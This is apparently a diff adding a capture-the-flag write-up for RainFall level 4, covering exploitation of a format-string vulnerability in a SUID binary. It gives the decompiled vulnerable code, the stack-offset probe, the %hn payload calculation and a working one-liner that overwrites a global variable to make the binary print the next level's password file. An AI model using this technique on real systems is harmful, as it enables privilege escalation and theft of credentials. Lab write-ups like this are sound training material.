@@ -1,0 +1,63 @@
+scp -P 4242 level4@RainFall:level4 <local_path>
+
+  ----------------------------------------------------------------------------------
+
+We can see a similar behavior than in level 3 but routed through what seems to be a
+wrapper p
+
+  void p(char *s){ printf(s); }              // ← fmt-string vuln
+
+  void n(){
+      char buf[0x208];
+      fgets(buf, 0x200, stdin);
+      p(buf);
+      if (m == 0x1025544)                    // m @ 0x08049810
+          system("/bin/cat /home/user/level5/.pass");
+  }
+
+  So the Goal: set m = 0x01025544 via the format string in printf(buf), so the         
+  SUID-level5 binary runs cat on level5's pass file.
+
+  ----------------------------------------------------------------------------------
+
+  (echo 'AAAA %1$x %2$x %3$x %4$x %5$x %6$x %7$x %8$x %9$x %10$x %11$x %12$x %13$x %14$x %15$x' | ./level4)
+	⎿ AAAA b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 41414141 24312520 32252078 25207824
+
+AAAA lands at %12$. So our buffer's first 4 bytes are accessible as %12$, the next 4 
+as %13$.
+
+  ----------------------------------------------------------------------------------
+
+  m value is 16.930.116 (0x01025544 in decimal). Printing ~17 million spaces to reach
+  that count would be enormous and slow.
+
+  The trick to do it is to une %hn (half-word write, 16 bits at a time) to split it
+  into smaller writes:
+
+  NOTE: 16-bit -> 0 to 65536 values
+
+    write 0x5544 to m   (= addr 0x08049810)
+	write 0x0102 to m+2 (= addr 0x08049812)
+  
+  ----------------------------------------------------------------------------------
+
+  To build the payload we'll use the following formula:
+
+  [addr_low][addr_high][padding_1][%12$hn][padding_2][%13$hn]
+
+  padding_1 = 21828 (0x5544 in decimal)
+
+  258 (0x0102 in decimal) + 65536 = 65794
+  padding_2 = 65794 - 21828 => 43966
+
+  \x10\x98\x04\x08 + \x12\x98\x04\x08 + %21828x + %12$hn + %43966x + %13$hn
+
+  ----------------------------------------------------------------------------------
+
+  After some tries we realised that the password was lost in the ~65KB of "garbage"
+  (our padding) so to be sure to get to have it the cleanest way was to filter the
+  lines that looked like a password (64 hex chars):
+
+  printf '\x10\x98\x04\x08\x12\x98\x04\x08%%21820x%%12$hn%%43966x%%13$hn' \
+  | /home/user/level4/level4 \
+  | grep -oE '[0-9a-f]{64}'
